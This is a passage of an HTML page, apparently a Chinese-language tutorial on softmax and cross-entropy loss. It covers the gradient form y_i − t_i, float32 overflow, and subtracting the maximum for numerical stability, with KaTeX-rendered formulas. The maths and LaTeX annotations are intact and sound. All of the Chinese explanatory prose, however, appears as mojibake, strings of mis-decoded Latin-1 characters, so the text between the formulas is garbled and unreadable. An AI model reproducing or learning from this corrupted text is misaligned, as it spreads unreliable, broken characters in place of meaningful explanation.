<li><strong>éè´Ÿæ€§</strong>ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mo>&gt;</mo><mn>0</mn></mrow><annotation encoding="application/x-tex">e^{o_i} &gt; 0</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7035em;vertical-align:-0.0391em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">0</span></span></span></span></span>ï¼Œä¿è¯æ¦‚ç‡ä¸ºæ­£ã€‚</li>
<li><strong>å½’ä¸€åŒ–</strong>ï¼š<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ‘</mo><msub><mi>y</mi><mi>i</mi></msub><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">\sum y_i = 1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">1</span></span></span></span></span>ï¼Œç¬¦åˆæ¦‚ç‡å®šä¹‰ã€‚</li>
<li><strong>å·®å¼‚æ”¾å¤§</strong>ï¼šæŒ‡æ•°å‡½æ•°ä¼šæ‹‰å¤§æ•°å€¼ä¹‹é—´çš„å·®è·ï¼Œä½¿â€œå¼ºè€…æ’å¼ºâ€ã€‚</li>
</ul>
<h3 data-id="heading-2">1.2 äº¤å‰ç†µæŸå¤± (Cross-Entropy Loss)</h3>
<p>äº¤å‰ç†µç”¨äºè¡¡é‡â€œé¢„æµ‹æ¦‚ç‡åˆ†å¸ƒâ€ä¸â€œçœŸå®æ ‡ç­¾åˆ†å¸ƒâ€ä¹‹é—´çš„å·®å¼‚ã€‚</p>
<p><strong>å…¬å¼ï¼š</strong>
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo>âˆ’</mo><msubsup><mo>âˆ‘</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mi>C</mi></msubsup><msub><mi>t</mi><mi>i</mi></msub><mo>â‹…</mo><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mi>i</mi></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = - \sum_{i=1}^{C} t_i \cdot \log(y_i)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.2809em;vertical-align:-0.2997em;"/><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:0em;">âˆ‘</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9812em;"><span style="top:-2.4003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">i</span><span class="mrel mtight">=</span><span class="mord mtight">1</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.07153em;">C</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2997em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">â‹…</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>å…¶ä¸­ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>t</mi></mrow><annotation encoding="application/x-tex">t</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6151em;"/><span class="mord mathnormal">t</span></span></span></span></span> æ˜¯çœŸå®æ ‡ç­¾çš„ One-hot ç¼–ç å‘é‡ï¼ˆæ­£ç¡®ç±»åˆ«ä¸º 1ï¼Œå…¶ä½™ä¸º 0ï¼‰ã€‚å› æ­¤ï¼Œå¯¹äºå•ä¸ªæ ·æœ¬ï¼Œå…¬å¼ç®€åŒ–ä¸ºï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>L</mi><mo>=</mo><mo>âˆ’</mo><mi>log</mi><mo>â¡</mo><mo stretchy="false">(</mo><msub><mi>y</mi><mtext>correct</mtext></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">L = - \log(y_{\text{correct}})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal">L</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord">âˆ’</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord text mtight"><span class="mord mtight">correct</span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>å³ï¼š<strong>æˆ‘ä»¬åªå…³å¿ƒæ¨¡å‹å¯¹â€œæ­£ç¡®ç±»åˆ«â€é¢„æµ‹äº†å¤šå¤§çš„æ¦‚ç‡ã€‚</strong></p>
<h3 data-id="heading-3">1.3 ä¸ºä»€ä¹ˆå®ƒä»¬æ˜¯â€œé»„é‡‘æ­æ¡£â€ï¼Ÿ</h3>
<p>å½“æˆ‘ä»¬å°† Softmax å’Œ Cross-Entropy ç»“åˆåœ¨ä¸€èµ·å¯¹ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">o_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> æ±‚å¯¼æ—¶ï¼Œä¼šå¾—åˆ°éå¸¸ä¼˜é›…çš„æ¢¯åº¦å½¢å¼ï¼š</p>
<p><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mrow><mi mathvariant="normal">âˆ‚</mi><mi>L</mi></mrow><mrow><mi mathvariant="normal">âˆ‚</mi><msub><mi>o</mi><mi>i</mi></msub></mrow></mfrac><mo>=</mo><msub><mi>y</mi><mi>i</mi></msub><mo>âˆ’</mo><msub><mi>t</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">\frac{\partial L}{\partial o_i} = y_i - t_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3252em;vertical-align:-0.4451em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">âˆ‚</span><span class="mord mathnormal mtight">L</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.4451em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7778em;vertical-align:-0.1944em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:-0.0359em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.7651em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">t</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span></p>
<p><strong>ç‰©ç†å«ä¹‰ï¼š</strong> æ¢¯åº¦ç­‰äº <strong>(é¢„æµ‹æ¦‚ç‡) - (çœŸå®æ ‡ç­¾)</strong>ã€‚</p>
<ul>
<li>è¿™ç§çº¿æ€§çš„æ¢¯åº¦ç‰¹æ€§é¿å…äº†å‡æ–¹è¯¯å·®ï¼ˆMSEï¼‰åœ¨åˆ†ç±»ä»»åŠ¡ä¸­å¯èƒ½é‡åˆ°çš„æ¢¯åº¦æ¶ˆå¤±é—®é¢˜ã€‚</li>
<li>è¯¯å·®è¶Šå¤§ï¼Œæ¢¯åº¦è¶Šå¤§ï¼Œæ¨¡å‹å‚æ•°æ›´æ–°è¶Šå¿«ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-4">2. å·¥ç¨‹æŒ‘æˆ˜ï¼šæ•°å€¼ç¨³å®šæ€§ (Numerical Stability)</h2>
<p>åœ¨å®é™…å·¥ç¨‹è½åœ°æ—¶ï¼Œç›´æ¥æŒ‰ç…§æ•°å­¦å…¬å¼è®¡ç®— Softmax ä¼šé‡åˆ°ä¸¥é‡é—®é¢˜ã€‚</p>
<h3 data-id="heading-5">2.1 ä¸Šæº¢é—®é¢˜</h3>
<p>æŒ‡æ•°å‡½æ•° <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mi>x</mi></msup></mrow><annotation encoding="application/x-tex">e^x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">x</span></span></span></span></span></span></span></span></span></span></span></span> å¢é•¿æå¿«ã€‚åœ¨æ ‡å‡†çš„ <code>float32</code> æµ®ç‚¹æ•°ç³»ç»Ÿä¸­ï¼š</p>
<ul>
<li><span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mn>100</mn></msup><mo>â‰ˆ</mo><mn>2.6</mn><mo>Ã—</mo><mn>1</mn><msup><mn>0</mn><mn>43</mn></msup></mrow><annotation encoding="application/x-tex">e^{100} \approx 2.6 \times 10^{43}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">100</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â‰ˆ</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"/><span class="mord">2.6</span><span class="mspace" style="margin-right:0.2222em;"/><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"/></span><span class="base"><span class="strut" style="height:0.8141em;"/><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">43</span></span></span></span></span></span></span></span></span></span></span></span></span></li>
<li>è‹¥ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>o</mi><mi>i</mi></msub><mo>&gt;</mo><mn>88</mn></mrow><annotation encoding="application/x-tex">o_i &gt; 88</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6891em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6444em;"/><span class="mord">88</span></span></span></span></span>ï¼Œåˆ™ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mo>â†’</mo><mtext>inf</mtext></mrow><annotation encoding="application/x-tex">e^{o_i} \to \text{inf}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6644em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6644em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3281em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">â†’</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.6944em;"/><span class="mord text"><span class="mord">inf</span></span></span></span></span></span> (æ— ç©·å¤§)ã€‚</li>
</ul>
<p>ä¸€æ—¦åˆ†å­æˆ–åˆ†æ¯å‡ºç° <code>inf</code>ï¼Œè®¡ç®—ç»“æœå°±ä¼šå˜æˆ <code>NaN</code> (Not a Number)ï¼Œå¯¼è‡´è®­ç»ƒå´©æºƒã€‚</p>
<h3 data-id="heading-6">2.2 è§£å†³æ–¹æ¡ˆï¼šå‡å»æœ€å¤§å€¼ (The Max Trick)</h3>
<p>åˆ©ç”¨ Softmax çš„ <strong>å¹³ç§»ä¸å˜æ€§</strong>ï¼Œæˆ‘ä»¬åœ¨åˆ†å­åˆ†æ¯çš„æŒ‡æ•°ä¸­åŒæ—¶å‡å»è¾“å…¥å‘é‡çš„æœ€å¤§å€¼ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>M</mi><mo>=</mo><mi>max</mi><mo>â¡</mo><mo stretchy="false">(</mo><mi mathvariant="bold">o</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">M = \max(\mathbf{o})</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mop">max</span><span class="mopen">(</span><span class="mord mathbf">o</span><span class="mclose">)</span></span></span></span></span>ã€‚</p>
<p><strong>æ¨å¯¼ï¼š</strong>
<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mtext>Softmax</mtext><mo stretchy="false">(</mo><msub><mi>o</mi><mi>i</mi></msub><mo stretchy="false">)</mo><mo>=</mo><mfrac><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mrow><mo>âˆ‘</mo><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup></mrow></mfrac><mo>=</mo><mfrac><mrow><msup><mi>e</mi><msub><mi>o</mi><mi>i</mi></msub></msup><mo>â‹…</mo><msup><mi>e</mi><mrow><mo>âˆ’</mo><mi>M</mi></mrow></msup></mrow><mrow><mo stretchy="false">(</mo><mo>âˆ‘</mo><msup><mi>e</mi><msub><mi>o</mi><mi>j</mi></msub></msup><mo stretchy="false">)</mo><mo>â‹…</mo><msup><mi>e</mi><mrow><mo>âˆ’</mo><mi>M</mi></mrow></msup></mrow></mfrac><mo>=</mo><mfrac><msup><mi>e</mi><mrow><msub><mi>o</mi><mi>i</mi></msub><mo>âˆ’</mo><mi>M</mi></mrow></msup><mrow><mo>âˆ‘</mo><msup><mi>e</mi><mrow><msub><mi>o</mi><mi>j</mi></msub><mo>âˆ’</mo><mi>M</mi></mrow></msup></mrow></mfrac></mrow><annotation encoding="application/x-tex">\text{Softmax}(o_i) = \frac{e^{o_i}}{\sum e^{o_j}} = \frac{e^{o_i} \cdot e^{-M}}{(\sum e^{o_j}) \cdot e^{-M}} = \frac{e^{o_i - M}}{\sum e^{o_j - M}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord text"><span class="mord">Softmax</span></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.4413em;vertical-align:-0.5303em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.911em;"><span style="top:-2.6447em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">âˆ‘</span><span class="mspace mtight" style="margin-right:0.1952em;"/><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.779em;"><span style="top:-2.9714em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight">i</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5303em;"><span/></span></span></span></span><span class="mclose nulldelimiter"/></span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:1.5677em;vertical-align:-0.5303em;"/><span class="mord"><span class="mopen nulldelimiter"/><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.0374em;"><span style="top:-2.6447em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mop op-symbol small-op mtight" style="position:relative;top:0em;">âˆ‘</span><span class="mspace mtight" style="margin-right:0.1952em;"/><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.779em;"><span style="top:-2.9714em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.5092em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mclose mtight">)</span><span class="mbin mtight">â‹…</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7741em;"><span style="top:-2.786em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mathnormal mtight" style="margin-right:0.10903em;">M</span></span></span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"/><span class="frac-line" style="border-bottom-width:0.04em;"/></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7385em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3448em;"><span style="top:-2.3448em;margin-left:0em;margin-right:0.1em;"><span class="pstrut" style="height:2.6595em;"/><span class="mord mathnormal mtight">i</span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3147em;"><span/></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mbin mtight">â‹…</span><span class="mord mtight"><span class="mord mathnormal mtight">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.9191em;"><span style="top:-2.931em;margin-right:0.0714em;"><span class="pstrut" style="height:2.5em;"/><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mathnormal mtight" 